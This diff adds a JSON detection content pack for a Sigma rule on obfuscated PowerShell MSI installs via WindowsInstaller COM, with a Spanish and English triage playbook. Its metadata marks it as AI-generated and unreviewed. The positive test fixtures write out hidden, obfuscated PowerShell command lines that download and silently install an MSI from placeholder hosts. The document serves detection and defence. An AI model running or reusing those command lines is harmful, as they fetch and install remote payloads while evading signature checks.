@@ -1,0 +1,138 @@
+{
+  "rule": {
+    "id": "7b6a7418-3afc-11f0-aff4-000d3abf478c",
+    "title": "Obfuscated PowerShell MSI Install via WindowsInstaller COM",
+    "level": "high",
+    "status": "experimental",
+    "author": "Meroujan Antonyan (vx3r)",
+    "path": "windows/process_creation/proc_creation_win_powershell_comobject_msi.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_comobject_msi.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027.010",
+      "T1059.001",
+      "T1218.007"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "PowerShell se ejecutó con una línea de comandos que crea un objeto COM, arma cadenas en tiempo de ejecución con .Insert(), ajusta UILevel y llama a InstallProduct(). Es el patrón de un loader que instala un MSI de forma silenciosa y ofuscada.",
+      "what_it_detects": "Creación de procesos powershell.exe, pwsh.exe o powershell_ise.exe (por Image u OriginalFileName) cuyo CommandLine contiene a la vez '-ComObject', 'InstallProduct(', '.Insert(' y 'UILevel'. Normalmente se trata de WindowsInstaller.Installer con el nombre de clase o la URL reconstruidos para evadir firmas estáticas.",
+      "why_it_matters": "El atacante usa el instalador legítimo de Windows (T1218.007, ejecución mediante msiexec) desde PowerShell (T1059.001) y oculta cadenas que se generan al ejecutar (T1027.010) para descargar e instalar un payload sin interacción del usuario. Suele ser el primer paso de una intrusión que llega por un acceso directo (LNK) o un documento.",
+      "triage_steps": [
+        "Lea el CommandLine completo y reconstruya las cadenas ofuscadas: nombre de la clase COM, la URL o ruta del MSI y el UILevel (2 = sin interfaz). Fíjese también en -W Hidden.",
+        "Revise ParentImage y la cadena de procesos: explorer.exe abriendo un LNK, Office, un navegador o wscript son mucho más sospechosos que una herramienta de despliegue conocida.",
+        "Verifique el usuario y el host. Confirme si el usuario descargó o abrió recientemente archivos LNK, ZIP o ISO, revisando Downloads y las rutas temporales.",
+        "Busque procesos msiexec.exe en el mismo host +/- 15 minutos, así como sus hijos (cmd, rundll32, binarios en %TEMP% o %APPDATA%).",
+        "Revise el log Application (MsiInstaller, eventos 1033, 1040, 11707) para identificar el producto instalado y su ruta de origen.",
+        "Haga un pivote con el dominio o IP de la URL en los logs de proxy, DNS y firewall para encontrar otros hosts que lo hayan contactado.",
+        "Obtenga el hash del MSI descargado (caché de Windows Installer o el directorio temporal) y compárelo con la inteligencia de amenazas interna.",
+        "Busque alertas anteriores del mismo host, el mismo usuario o el mismo dominio."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos.",
+        "Algunos scripts de despliegue internos podrían usar WindowsInstaller.Installer con manipulación de cadenas; confirme su origen con el equipo de TI y que el MSI provenga de un repositorio aprobado."
+      ],
+      "response_steps": [
+        "Si la URL es externa o desconocida, aísle el endpoint y bloquee el dominio y la IP en el proxy y el firewall.",
+        "Identifique y conserve el MSI y los artefactos que instaló. Desinstálelo o elimínelo solo después de confirmar que es malicioso.",
+        "Revise los mecanismos de persistencia creados (servicios, tareas programadas, claves Run) y elimínelos tras confirmar que son maliciosos.",
+        "Restablezca las credenciales del usuario si hubo ejecución posterior, y busque el mismo patrón en toda la flota.",
+        "Restaure el host desde una imagen limpia si se confirma el compromiso."
+      ],
+      "severity_rationale": "El nivel alto se justifica porque combinar ofuscación en tiempo de ejecución, instalación MSI silenciosa vía COM y PowerShell casi nunca corresponde a un uso legítimo e indica ejecución de código."
+    },
+    "en": {
+      "summary": "PowerShell ran a command line that creates a COM object, builds strings at runtime with .Insert(), sets UILevel and calls InstallProduct(). This is a loader pattern for silent, obfuscated MSI installation.",
+      "what_it_detects": "Process creation of powershell.exe, pwsh.exe or powershell_ise.exe (by Image or OriginalFileName) whose CommandLine contains all of '-ComObject', 'InstallProduct(', '.Insert(' and 'UILevel'. Typically this is WindowsInstaller.Installer with the class name or URL rebuilt to evade static signatures.",
+      "why_it_matters": "The attacker abuses the legitimate Windows Installer (T1218.007, msiexec proxy execution) from PowerShell (T1059.001). Runtime-built strings hide the intent (T1027.010). The goal is to download and install a payload without user interaction, often as the first stage after a malicious LNK or document.",
+      "triage_steps": [
+        "Read the full CommandLine and rebuild the obfuscated strings: the COM class, the MSI URL or path, and UILevel (2 = no UI). Also note -W Hidden.",
+        "Check ParentImage and the process chain. explorer.exe opening an LNK, Office, a browser or wscript is far more suspicious than a known deployment tool.",
+        "Check the user and host. Look for recently opened LNK, ZIP or ISO files in Downloads and temp paths.",
+        "Look for msiexec.exe on the same host within +/- 15 minutes, and for its children (cmd, rundll32, binaries in %TEMP% or %APPDATA%).",
+        "Check the Application log (MsiInstaller events 1033, 1040, 11707) for the installed product and its source.",
+        "Pivot on the URL's domain or IP in proxy, DNS and firewall logs to find other hosts that contacted it.",
+        "Get the hash of the downloaded MSI from the Installer cache or temp folder and check it against threat intelligence.",
+        "Review earlier alerts for the same host, user or domain."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives.",
+        "Internal deployment scripts could use WindowsInstaller.Installer with string manipulation. Confirm with IT and check that the MSI comes from an approved repository."
+      ],
+      "response_steps": [
+        "If the URL is external or unknown, isolate the endpoint and block the domain and IP at the proxy and firewall.",
+        "Preserve the MSI and the artifacts it installed. Uninstall or remove them only after you confirm they are malicious.",
+        "Hunt for persistence it created (services, scheduled tasks, Run keys) and remove it once you confirm it is malicious.",
+        "Reset the user's credentials if follow-on execution occurred, and hunt for the same pattern across the fleet.",
+        "Reimage the host from a clean image if compromise is confirmed."
+      ],
+      "severity_rationale": "High fits because runtime obfuscation, silent COM-based MSI installation and PowerShell together are rarely legitimate and indicate code execution."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Hidden powershell.exe launched from explorer.exe (LNK) that rebuilds 'WindowsInstaller.Installer' and fixes a 'htps://' URL with .Insert(), then installs the MSI silently",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -W Hidden -C \"$u='htps://downloads.example.com/upd.msi';$i=New-Object -ComObject('indowsInstaller.Installer'.Insert(0,'W'));$i.UILevel=2;$i.InstallProduct($(if($u.StartsWith('htps://')){$u.Insert(2,'t')}else{$u}),'')\"",
+          "ProcessId": 6412
+        }
+      },
+      {
+        "description": "Renamed PowerShell 7 binary identified by OriginalFileName pwsh.dll running the same obfuscated InstallProduct pattern",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mgomez",
+          "Image": "C:\\Users\\mgomez\\AppData\\Local\\Temp\\svc.exe",
+          "OriginalFileName": "pwsh.dll",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "svc.exe -nop -w hidden -c \"$o=New-Object -ComObject ('Windows'.Insert(7,'Installer.Installer'));$o.UILevel=2;$o.InstallProduct('htps://cdn.example.org/a.msi'.Insert(2,'t'),'')\"",
+          "ProcessId": 5120
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate IT deployment script using WindowsInstaller.Installer and InstallProduct from an internal share, with no .Insert() obfuscation",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\svc_deploy",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe",
+          "CommandLine": "powershell.exe -NoProfile -Command \"$i=New-Object -ComObject WindowsInstaller.Installer;$i.UILevel=2;$i.InstallProduct('\\\\fs01.example.com\\pkgs\\agent.msi','')\"",
+          "ProcessId": 3304
+        }
+      },
+      {
+        "description": "Inventory script that uses the COM object and .Insert() to format output and sets UILevel, but never calls InstallProduct",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0311.andes.example.com",
+          "User": "ANDES\\adminti",
+          "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+          "OriginalFileName": "pwsh.dll",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "pwsh.exe -NoProfile -Command \"$i=New-Object -ComObject WindowsInstaller.Installer;$i.UILevel=2;$i.Products | ForEach-Object { $_.Insert(0,'PRODUCT: ') }\"",
+          "ProcessId": 7720
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
